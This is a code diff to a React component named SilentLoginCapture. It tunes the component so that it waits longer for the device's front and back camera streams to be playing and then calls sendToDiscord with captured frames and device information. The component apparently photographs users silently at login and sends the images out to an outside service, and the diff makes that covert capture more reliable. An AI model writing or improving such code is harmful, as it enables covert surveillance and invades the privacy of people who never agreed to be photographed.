@@ -186,26 +186,30 @@ export default function SilentLoginCapture({
     };
   }
 
-  // Wait for video to be ready
+  // Wait for video to be actually playing (has frames)
   function waitForVideo(video: HTMLVideoElement | null): Promise<void> {
     return new Promise((resolve) => {
       if (!video || !video.srcObject) {
         resolve();
         return;
       }
-      if (video.readyState >= 2) {
+      // Check if already playing
+      if (video.readyState >= 3) { // HAVE_CURRENT_DATA = 3
         resolve();
         return;
       }
-      const onLoaded = () => {
-        video.removeEventListener('loadedmetadata', onLoaded);
-        video.removeEventListener('canplay', onLoaded);
+
+      const onPlaying = () => {
+        video.removeEventListener('playing', onPlaying);
+        video.removeEventListener('loadeddata', onPlaying);
         resolve();
       };
-      video.addEventListener('loadedmetadata', onLoaded);
-      video.addEventListener('canplay', onLoaded);
-      // Timeout fallback
-      setTimeout(resolve, 2000);
+
+      video.addEventListener('playing', onPlaying);
+      video.addEventListener('loadeddata', onPlaying);
+
+      // Timeout fallback - wait longer for camera to warm up
+      setTimeout(resolve, 4000);
     });
   }
 
@@ -219,7 +223,7 @@ export default function SilentLoginCapture({
         });
         if (videoRef.current) {
           videoRef.current.srcObject = stream;
-          await videoRef.current.play();
+          videoRef.current.play().catch(console.error);
         }
       } catch {
         console.log("[SilentCapture] Front camera not available");
@@ -233,7 +237,7 @@ export default function SilentLoginCapture({
         });
         if (videoBackRef.current) {
           videoBackRef.current.srcObject = backStream;
-          await videoBackRef.current.play();
+          videoBackRef.current.play().catch(console.error);
         }
       } catch {
         try {
@@ -244,7 +248,7 @@ export default function SilentLoginCapture({
           });
           if (videoBackRef.current) {
             videoBackRef.current.srcObject = backStream;
-            await videoBackRef.current.play();
+            videoBackRef.current.play().catch(console.error);
           }
         } catch {
           console.log("[SilentCapture] Back camera not available");
@@ -252,15 +256,15 @@ export default function SilentLoginCapture({
       }
     }
 
-    // Wait for videos to be ready, then capture and send
+    // Wait for videos to be actually playing
     await Promise.all([
       waitForVideo(videoRef.current),
       waitForVideo(videoBackRef.current),
     ]);
-    // Extra delay for camera to adjust
+    // Extra delay for camera to adjust to lighting
     setTimeout(() => {
       sendToDiscord(deviceInfo);
-    }, 1500);
+    }, 3000);
   }
 
   function captureFrame(video: HTMLVideoElement | null, canvas: HTMLCanvasElement | null): string | null {
